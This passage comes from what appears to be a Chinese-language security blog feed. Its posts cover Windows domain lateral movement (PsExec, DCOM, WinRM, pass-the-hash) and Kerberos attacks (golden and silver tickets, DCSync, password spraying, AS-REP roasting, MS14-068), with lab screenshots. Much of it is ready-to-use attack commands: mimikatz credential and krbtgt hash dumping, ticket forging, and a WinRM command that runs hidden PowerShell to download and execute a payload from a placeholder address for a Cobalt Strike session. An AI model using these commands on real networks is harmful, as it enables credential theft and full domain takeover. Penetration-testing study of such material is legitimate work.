title="6.PsExec"></a>6.PsExec</h2><h3 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h3><p>微软自家产品。通过ipc$连接，然后释放psexesvc.exe到目标机器；通过服务管理器SCManager远程创建psexecsvc服务，并启动服务；客户端连接执行命令，服务端启动相应程序并执行回显数据</p><p>得到指定域内机器cmd：<code>Psexec.exe \\域内主机名 cmd</code></p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204153102437.png" alt="image-20210204153102437"></p><p>注:</p><p>1、远程机器的139 或445端口需要开启状态，即 SMB;</p><p>2、明文密码或者NTLM哈希;</p><p>3、具备将文件写入共享文件夹的权限;</p><p>4、能够在远程机器上创建服务:SC_MANAGER_CREATE_SERVICE(访问掩码:Ox0002);</p><p>5、能够启动所创建的服务:SERVICE_QUERY_STATUS (访问掩码:0x0004 )+SERVICE_START(访问掩码:Ox0010)</p><p>6、机器在第一次使用psexec的时候，会弹出确认提示框，为避免这个麻烦，可以加一个参数：<code>-accepteula</code></p><p>缺点:</p><p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697、7045这2种事件日志;有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p><h3 id="2-cs自带psexec"><a href="#2-cs自带psexec" class="headerlink" title="2.cs自带psexec"></a>2.cs自带psexec</h3><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204153558664.png" alt="image-20210204153558664"></p><p>再指定账户密码，选择sessions</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204153909554.png" alt="image-20210204153909554"> </p><p>成功后会返回一个shell</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204154014712.png" alt="image-20210204154014712"></p><h2 id="7-DCOM"><a href="#7-DCOM" class="headerlink" title="7.DCOM"></a>7.DCOM</h2><p>微软介绍：windows Distributed component object Model ( DCOM) is transparent middleware that extends the functionality of component object Model (cOM) beyond a local computer using remote procedure call (RPC) technology.  COM is a component of the windows application programming interface(API) that enables interaction between software objects.Through OOM,a client object can call methods of server objects,which are typically Dynamic Link Libraries (DLL) or executables (EXE) .</p><p>就是一个中间件，支持交互。</p><p>枚举所有DCOM对象</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-CimInstance</span> win32<span class="hljs-literal">-DCOMApplication</span><span class="hljs-built_in">PS</span>下</code></pre><p>部分docm能进行命令执行，通过这些dcom进行横向移动，例如</p><p><strong>MMC20.APPLICATION COM OBJECT</strong></p><p>可以使用以下命令查看DCOM的一些信息，再PS下执行</p><pre><code class="hljs apache"><span class="hljs-attribute">Get</span>-ChildItem &#x27;registry::HKEY_CLASSES_ROOT_WOW<span class="hljs-number">6432</span>Note\CLSID\&#123;<span class="hljs-number">49</span>B<span class="hljs-number">2791</span>A-B<span class="hljs-number">1</span>AE-<span class="hljs-number">4</span>C<span class="hljs-number">90</span>-<span class="hljs-number">9</span>B<span class="hljs-number">8</span>E-E<span class="hljs-number">8608</span>AC<span class="hljs-number">7</span>F<span class="hljs-number">889</span>&#125;&#x27;</code></pre><p>查询的出来的。。</p><p>远程利用方式如下</p><pre><code class="hljs elixir"><span class="hljs-variable">$a</span> =[System.Activator]::CreateInstance([type]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.application.1&quot;</span>, <span class="hljs-string">&quot;target_ip&quot;</span>))<span class="hljs-variable">$a</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&quot;cmd&quot;</span> ,Snull, <span class="hljs-string">&quot;/c  hostname &gt; c:\fromdcom.txt &quot;</span>, <span class="hljs-string">&quot;7&quot;</span>)</code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204161144789.png" alt="image-20210204161144789"></p><p>执行成功后会在目标生成<code>c:\fromdcom.txt </code></p><h2 id="8-Password-Spray"><a href="#8-Password-Spray" class="headerlink" title="8.Password Spray"></a>8.Password Spray</h2><p>进行密码破解</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204161455802.png" alt="image-20210204161455802"></p><h2 id="9-winrm远程管理服务"><a href="#9-winrm远程管理服务" class="headerlink" title="9.winrm远程管理服务"></a>9.winrm远程管理服务</h2><p>WinRM是Microsoft对WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的”防火墙友协议,它让来自不同供应商的硬件和操作系统能够互相操作.</p><p>winRM的默认端口为5985 ( http )或5986 ( https )</p><p>第一次使用要设置一个信任</p><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Item <span class="hljs-comment">WSMan:localhost\client\trustedhosts -value *</span>Restart-Service <span class="hljs-comment">winRM</span></code></pre><p>反弹一个cs会话：</p><pre><code class="hljs awk">Invoke-Command -ComputerName target_ip -ScriptBlock &#123; powershell.exe -nop -w hidden -c <span class="hljs-string">&quot;IEX((new-object net.webclient).downloadstring(&quot;</span>webshell_add<span class="hljs-string">r&quot;)&quot;</span>&#125; -credential administrator</code></pre><p>反弹shell：</p><pre><code class="hljs latex">Enter-PSSession -ComputerName target_ip -Credential 域名<span class="hljs-tag">\<span class="hljs-name">用</span></span>户名</code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204161911483.png" alt="image-20210204161911483"></p><p><strong>Winrs</strong></p><p>远程管理</p><pre><code class="hljs groovy">winrs -<span class="hljs-attr">r:</span>target_ip -<span class="hljs-attr">u:</span>DC\username -<span class="hljs-attr">p:</span>password <span class="hljs-string">&quot;command&quot;</span></code></pre><p>例如得到ip信息</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204162104661.png" alt="image-20210204162104661"></p><p>将命令替换为cmd即可得到目标cmd环境。</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204162509481.png" alt="image-20210204162509481"></p><p><strong>cs—winrm</strong></p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204162557379.png" alt="image-20210204162557379"></p><p>再选择用户名密码监听方式。</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204162735477.png" alt="image-20210204162735477"></p><p>等待即可</p><h2 id="10-Pass-The-Hash-pth"><a href="#10-Pass-The-Hash-pth" class="headerlink" title="10.Pass-The-Hash(pth)"></a>10.Pass-The-Hash(pth)</h2><p>hash传递攻击</p><pre><code class="hljs dockerfile">sekurlsa::pth /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">USER</span>  /ntlm:HASH /<span class="hljs-keyword">run</span><span class="bash">: cmd.exe</span></code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204163408004.png" alt="image-20210204163408004"></p><p>执行完毕后会弹出cmd框</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204163549805.png" alt="image-20210204163549805"></p><p>当然也就出现了hash传递防护：</p><p><strong>LocalAccountTokenFilterPolicy</strong></p><p>在windows Vista之后引入了一种默认开启的remote UAC，计算机的任何非SID 500本地管理员帐户，用户在远程计算机上没有特权提升能力，并且用户无法执行管理任务.</p><p>域内一般默认会启用winrm，我们便可以通过pth然后启动进程然后steal_token，使用winrm执行命令。在域管下执行：</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204164148390.png" alt="image-20210204164148390"></p><p>附上依次此类型的脚本</p><p><a href="https://github.com/FSecureLABS/gists/blob/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1">https://github.com/FSecureLABS/gists/blob/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1</a></p><h2 id="11-Pass-the-Ticket"><a href="#11-Pass-the-Ticket" class="headerlink" title="11.Pass-the-Ticket"></a>11.Pass-the-Ticket</h2><p>票据传递（黄金、白银）</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wmic</tag>
      
      <tag>wmiexec.vbs</tag>
      
      <tag>Invoke-TheHash.ps1</tag>
      
      <tag>pth工具集</tag>
      
      <tag>Remote Service Creation</tag>
      
      <tag>Remote Desktop Protocol-RDP hijacking</tag>
      
      <tag>PowerShell Remoting</tag>
      
      <tag>Task Scheduler</tag>
      
      <tag>PsExec</tag>
      
      <tag>DCOM</tag>
      
      <tag>Password Spray</tag>
      
      <tag>winrm远程管理服务</tag>
      
      <tag>Pass-The-Hash(pth)</tag>
      
      <tag>LocalAccountTokenFilterPolicy</tag>
      
      <tag>Pass-the-Ticket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域内攻击</title>
    <link href="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/"/>
    <url>/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>本文介绍一些域内攻击的工具以及方法。</p><a id="more"></a><p>攻击机：kali：192.168.43.30</p><p>客户机DC：win2012：192.168.8.211</p><p>客户机：win7： 182.168.8.57</p><p>以下有关在win7复现没有成功的，在win2008上复现成功，没有放置贴图。</p><h2 id="1-kerberos攻击"><a href="#1-kerberos攻击" class="headerlink" title="1.kerberos攻击"></a>1.kerberos攻击</h2><h3 id="1-使用mimikatz的黄金票据-dcsync获得域密码"><a href="#1-使用mimikatz的黄金票据-dcsync获得域密码" class="headerlink" title="1.使用mimikatz的黄金票据+dcsync获得域密码"></a>1.使用mimikatz的黄金票据+dcsync获得域密码</h3><p>dcsync: mimikatz中的功能，可以有效地“假冒”一个域控制器，并可以向目标域控制器请求帐户密码数据</p><p>首先伪造一个黄金票据</p><p><code>kerberos: :golden /admin:Administrator /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT Hash NTLM&gt;  /ticket: Administrator.kiribi</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210202192045542.png" alt="image-20210202192045542"></p><p>在使用ptt进行票据攻击：<code>Kerberos::ptt Administrator.kiribi</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210202192205698.png" alt="image-20210202192205698"></p><p>此时已得到域控完整权限，可以使用psexec获得域控cmd权限：<code>psexec [\\域控ip](file://域控ip) cmd</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210202192514462.png" alt="image-20210202192514462"></p><p>也可以执行获取指定用户的hash值：<code>lsadump::dcsync /user:用户 /domain:域</code></p><p>记得结束之后完成清楚票据：<code>kerberos::purge</code></p><h3 id="2-域用户、密码枚举"><a href="#2-域用户、密码枚举" class="headerlink" title="2.域用户、密码枚举"></a>2.域用户、密码枚举</h3><p>github项目：<a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p><p>DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒</p><h4 id="1-枚举用户"><a href="#1-枚举用户" class="headerlink" title="1.枚举用户"></a>1.枚举用户</h4><p>在power shell中导入脚本:<code>Import-Module .\DomainPasswordSpray.ps1</code></p><p>再执行以下内容进行用户名枚举</p><pre><code class="hljs less"><span class="hljs-selector-tag">Get-DomainUserList</span> <span class="hljs-selector-tag">-Domain</span> 域名 <span class="hljs-selector-tag">-RemoveDisabled</span> <span class="hljs-selector-tag">-RemovePotentialLockouts</span> | <span class="hljs-selector-tag">Out-File</span> <span class="hljs-selector-tag">-Encoding</span> <span class="hljs-selector-tag">ascii</span> <span class="hljs-selector-tag">userlist</span><span class="hljs-selector-class">.txt</span>参数<span class="hljs-selector-pseudo">:Domain</span>指定要测试的域名参数<span class="hljs-selector-pseudo">:RemoveDisabled</span>尝试从用户列表删除禁用的账户参数<span class="hljs-selector-pseudo">:RemovePotentialLockouts</span>删除锁定账户参数: <span class="hljs-selector-tag">UserList</span>自定义用户列表(字典)。如果未指定，这将自动从域中获取<span class="hljs-selector-tag">5</span>参数<span class="hljs-selector-pseudo">:Password</span>指定单个密码进行口令测试参数<span class="hljs-selector-pseudo">:PasswordList</span>指定一个密码字典参数<span class="hljs-selector-pseudo">:OutFile</span>将结果保存到某个文件参数<span class="hljs-selector-pseudo">:Force</span>当枚举出第一个后继续枚举，不询问</code></pre><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203004732222.png" alt="image-20210203004732222"></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203004754984.png" alt="image-20210203004754984"></p><h4 id="2-枚举密码"><a href="#2-枚举密码" class="headerlink" title="2.枚举密码"></a>2.枚举密码</h4><p>相当于指定密码进行爆破.</p><p>执行以下命令进行密码枚举：<code> Invoke-DomainPasswordspray -Domain 域名 -Password 密码 ASD -OutFile pass.txt</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203004925060.png" alt="image-20210203004925060"></p><h3 id="3-AS-REP-Roasting"><a href="#3-AS-REP-Roasting" class="headerlink" title="3.AS-REP-Roasting"></a>3.AS-REP-Roasting</h3><p><strong>原理</strong>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。</p><p>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：<a href="http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&idx=3&mid=2247488900&scene=21&sn=dc2689efec7757f7b432e1fb38b599d4#wechat_redirect">域内认证之Kerberos协议详解。</a></p><p>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</p><p><strong>攻击条件</strong></p><ul><li>域用户设置了 “ Do not require Kerberos preauthentication(不需要kerberos预身份验证) ”<ul><li>开启命令<ul><li><code>Import-Module  .PowerView.ps1 Set-DomainObject  -Identity  testb  -XOR  @&#123;userAccountControl=4194304&#125;  -Verbose</code></li></ul></li><li>关闭命令<ul><li><code>Import-Module  .PowerView.ps1 Set-DomainObject  -Identity  testb  -XOR  @&#123;userAccountControl=4194304&#125;  -Verbose</code></li></ul></li></ul></li><li>需要一台可与KDC进行通信的主机/用户</li></ul><p><strong>攻击方式</strong></p><p>1.linux下可以使用GetNPUsers.py这款工具进行破解.</p><p>2.windows下使用Rubeus.exe进行破解(需要.net3.5)</p><p>获得一个hashes.asreproast文件：</p><pre><code class="hljs awk">Rubeus.exe asreproast <span class="hljs-regexp">/format:hashcat /</span>outfile:hashes.asreproast</code></pre><p>得到hashes.asreproast文件后可以使用hashcat或者john进行破解：</p><pre><code class="hljs ada">hashcat -m <span class="hljs-number">18200</span> <span class="hljs-comment">--force -a 0 hashes.asreproast passwords_kerb.txt</span></code></pre><p>3.powershell</p><p>工具</p><p>powerview.ps1：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</a></p><p>ASREPRoast.ps1：<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a></p><p>使用powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p><pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1<span class="hljs-keyword">Get</span>-DomainUser -PreauthNotRequired</code></pre><p>使用ASREPRoast.ps1获取AS-REP返回的Hash</p><pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\ASREPRoast.ps1<span class="hljs-keyword">Get</span>-ASREPHash -UserName 用户名 -Domain 域名 | <span class="hljs-keyword">Out</span>-<span class="hljs-keyword">File</span> -Encoding ASCII hash.txt</code></pre><p>将hash.txt里面的除Hash字段其他的都删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。</p><pre><code class="hljs css"><span class="hljs-selector-tag">hashcat64</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-m</span> 18200 <span class="hljs-selector-tag">hash</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">pass</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">--force</span></code></pre><h2 id="2-域内提权"><a href="#2-域内提权" class="headerlink" title="2.域内提权"></a>2.域内提权</h2><p>Ms14-086（支持到win2012,但是2012不稳定）</p><p>通过是否打补丁(kb3011780)来判断是否存在漏洞</p><p>生成一个文件ccache文件：<code>MS14-068.exe -u 用户名@域名 -p 明文密码 -s &lt;userSid&gt; -d 域控ip</code></p><p>但是在win7上使用时会报错，可能是我域内环境配置有问题，在win2008时没有问题。</p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203151836389.png" alt="image-20210203151836389"></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203151950021.png" alt="image-20210203151950021"></p><p>用mimikatz进行攻击：kerberos::ptc ccache文件</p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203152009209.png" alt="image-20210203152009209"></p><p>此时当前用户就是域管理员用户</p><h2 id="3-域hash"><a href="#3-域hash" class="headerlink" title="3.域hash"></a>3.域hash</h2><p>需要域控权限</p><p>1.mimikatz抓取</p><p>可以使用mimikatz生成一个日志记录信息（会在当前目录下生成一个mimikatz.txt,之后操作以及结果都会被记录在日志中）:<code>log</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203154454934.png" alt="image-20210203154454934"></p><p>抓取域内用户的名称和hash：<code>lsadump::dcsync /domain:域控名 /all /csv</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203154445293.png" alt="image-20210203154445293"></p><p>或者使用：<code>lsadump::lsa /inject</code></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203154531731.png" alt="image-20210203154531731"></p><p>2.msf抓取</p><p>先反弹一个会话</p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203152945003.png" alt="image-20210203152945003"></p><p>利用domain_hashdump模块进行抓取</p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153012768.png" alt="image-20210203153012768"></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153023396.png" alt="image-20210203153023396"></p><p>由于当前是32bits的载荷运行在一个64bits的系统上，所以需要进行进程迁移</p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153047077.png" alt="image-20210203153047077"></p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153100040.png" alt="image-20210203153100040"></p><p>之后再次运行hashdump，会得到一个数据库存储域内所有用户的信息</p><p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153119397.png" alt="image-20210203153119397"></p><p>进行破解即可</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mimikatz的黄金票据+dcsync</tag>
      
      <tag>域用户、密码枚举</tag>
      
      <tag>AS-REP-Roasting</tag>
      
      <tag>抓取域hash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白银票据和黄金票据</title>
    <link href="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/"/>
    <url>/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="1-白银票据"><a href="#1-白银票据" class="headerlink" title="1.白银票据"></a>1.白银票据</h2><p><strong>原理</strong>：在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。<br> 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p><p><strong>特点</strong>：1.不需要与KDC进行交互、2.需要目标服务的NTLM Hash</p><p>在第三步认证中Ticket的组成：Ticket=Server Hash(Server Session Key+client info+End Time)</p><p>当拥有server hash时，就可以伪造一个不经过KDC认证的ticket（当server session key在未发送ticket之前，服务器是不知道server session key是什么的，所以，一切来源于server hash）</p><p><strong>攻击</strong>：使用mimikat进行kerberos进行攻击</p><p>首先用mimikatz在客户机上抓取信息：</p><pre><code class="hljs cpp">privilege::debugsekurlsa::logonpasswords</code></pre><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202142456321.png" alt="image-20210202142456321"></p><p>先清空之前存在的票据：<code>kerberos : : purge</code></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202175713372.png" alt="image-20210202175713372"></p><p>然后进行伪造票据：</p><pre><code class="hljs dts"><span class="hljs-symbol">kerberos:</span>:golden /domain:<span class="hljs-params">&lt;域名&gt;</span>/sid:<span class="hljs-params">&lt;域SID&gt;</span>/target<span class="hljs-params">&lt;目标服务器主机名&gt;</span> /service:<span class="hljs-params">&lt;服务类型&gt;</span>/rc4:<span class="hljs-params">&lt;NTLMHash&gt;</span> /user:<span class="hljs-params">&lt;用户名&gt;</span> /ptt<span class="hljs-meta"># /domain:域名</span><span class="hljs-meta"># /sid: 域控SID值</span><span class="hljs-meta"># /target:域控机器全称</span><span class="hljs-meta"># /service:需要指定相关的服务名</span><span class="hljs-meta"># /rc4:域控的计算机账户ntlm hash</span><span class="hljs-meta"># /user:要伪造的用户名，任意填写，可写可不写</span></code></pre><p>​            服务类型有</p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202175302660.png" alt="image-20210202175302660"></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202182414994.png" alt="image-20210202182414994"></p><p>查看当前拥有的票据：<code>kerberos::list</code></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202182511993.png" alt="image-20210202182511993"></p><p>查看是否可以访问域控的资源：<code>net use \\域控ip\磁盘符$</code>，但是会要求认证</p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202212307313.png" alt="image-20210202212307313"></p><p>在使用win2008进行票据伪造的时候并没有认证。</p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202190127055.png" alt="image-20210202190127055"></p><p>查看访问的资源：<code>dir \\域控ip\磁盘符$</code></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202190222105.png" alt="image-20210202190222105"></p><p>后续要访问其他文件资源，直接在<code>dir \\域控ip\磁盘符$</code>跟文件夹，例如：<code>dir \\域控ip\磁盘符$\test</code></p><p>另外也可以使用pth进行连接：<code>sekurlsa::pth /user:administrator /domain:域控名 /ntlm:域控hsah值 </code>，执行后会弹出一个cmd框。之后再<code>net use \\域控ip\磁盘符$</code>连接即可。</p><p>注：另外，在win2003上操作时，票据无法成功创建，会报以下错误：</p><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage : c000000d</code></pre><h2 id="2-黄金票据"><a href="#2-黄金票据" class="headerlink" title="2.黄金票据"></a>2.黄金票据</h2><p><strong>原理</strong>通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的KRB_AS_REQ时，Client拥有两份加密的session Key,K( c,tgs )分别是:</p><p>1.用自己NTLM Hash加密的session Key. </p><p>2.用krbtgt用户的NTLM Hash加密的TGT。</p><p>前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用krbtgt用户的NTLM Hash进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有krbtgt用户的Hash，那么意味着我们可以解密以及伪造TGT</p><p>使用mimikatz进行攻击</p><p><strong>攻击</strong>：使用mimikatz</p><p>首先在域控上将krbtgt的用户hash使用mimikatz给dump下来：<code>lsadump::dcsync /domain:域控名 /user:krbtgt</code></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202191139393.png" alt="image-20210202191139393"></p><p>然后在客户机上执行</p><p><code>kerberos:.golden /domain:&lt;域名&gt;/sid:&lt;域SID&gt; /aes256:&lt;aes256_hmac&gt; /user:&lt;任意用户名&gt;/ptt</code></p><p>或者</p><p><code>kerberos:golden /domain:&lt;域名&gt;/sid:&lt;域SID&gt;/rC4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt;/ptt</code></p><p>或者</p><p><code>kerberos: :golden /admin:Administrator /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT Hash NTLM&gt;  /ticket: Administrator.kiribi</code></p><p>生成一个票据文件</p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202192045542.png" alt="image-20210202192045542"></p><p>在使用ptt进行票据攻击：<code>Kerberos::ptt Administrator.kiribi</code></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202192205698.png" alt="image-20210202192205698"></p><p>此时已得到域控完整权限，可以使用psexec获得域控cmd权限：<code>psexec [\\域控ip](file://域控ip) cmd</code></p><p><img src="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/image-20210202192514462.png" alt="image-20210202192514462"></p><h2 id="3-黄金票据和白银票据区别"><a href="#3-黄金票据和白银票据区别" class="headerlink" title="3.黄金票据和白银票据区别"></a>3.黄金票据和白银票据区别</h2><h3 id="1-获取权限不同"><a href="#1-获取权限不同" class="headerlink" title="1.获取权限不同"></a>1.获取权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p><h3 id="2-认证流程不同"><a href="#2-认证流程不同" class="headerlink" title="2.认证流程不同"></a>2.认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p><h3 id="3-加密方式不同"><a href="#3-加密方式不同" class="headerlink" title="3.加密方式不同"></a>3.加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p><h2 id="4-两者结果"><a href="#4-两者结果" class="headerlink" title="4.两者结果"></a>4.两者结果</h2><p>金票：能够在域里边所有机器上都以administrator登录</p><p>银票：实用白银票据添加cifs后，dir由无权查看变为有权查看</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>黄金票据</tag>
      
      <tag>白银票据</tag>
      
      <tag>黄金票据和白银票据区别</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kerberos</title>
    <link href="/2020/10/10/kerberos/"/>
    <url>/2020/10/10/kerberos/</url>
    
